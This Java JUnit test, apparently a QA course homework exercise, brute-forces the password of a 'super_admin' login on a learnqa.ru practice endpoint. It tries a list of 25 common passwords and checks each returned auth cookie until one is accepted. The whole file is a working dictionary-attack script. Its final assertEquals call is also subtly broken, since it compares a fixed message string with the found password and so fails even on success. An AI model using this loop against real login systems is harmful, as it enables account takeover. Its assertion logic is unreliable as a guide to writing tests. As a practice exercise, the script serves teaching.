package badtests;

import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.util.Arrays;
import java.util.List;

import static org.junit.jupiter.api.Assertions.assertEquals;

public class PasswordCracker {

    @Test
    public void testPasswordCracker() {
        String login = "super_admin";
        List<String> passwords = Arrays.asList(
                "123456", "password", "123456789", "12345678", "12345", "1234567", "1234567890",
                "qwerty", "abc123", "111111", "123123", "admin", "letmein", "welcome", "monkey",
                "1234", "1q2w3e4r", "sunshine", "master", "qwertyuiop", "login", "passw0rd",
                "654321", "555555", "loveyou"
        );

        String correctPassword = null;

        for (String password : passwords) {
            // Шаг 1: Отправляем POST-запрос с логином и паролем
            Response loginResponse = RestAssured
                    .given()
                    .formParam("login", login)
                    .formParam("password", password)
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework");

            // Извлекаем значение cookie
            String authCookie = loginResponse.getCookie("auth_cookie");

            // Шаг 2: Проверяем авторизацию с помощью cookie
            Response checkAuthResponse = RestAssured
                    .given()
                    .cookie("auth_cookie", authCookie)
                    .get("https://playground.learnqa.ru/ajax/api/check_auth_cookie");

            String authStatus = checkAuthResponse.asString();

            if (!authStatus.equals("You are NOT authorized")) {
                correctPassword = password;
                System.out.println("Correct password: " + correctPassword);
                System.out.println("Auth status: " + authStatus);
                break;
            }
        }

        assertEquals("Correct password found", correctPassword, "Password not found");
    }
}
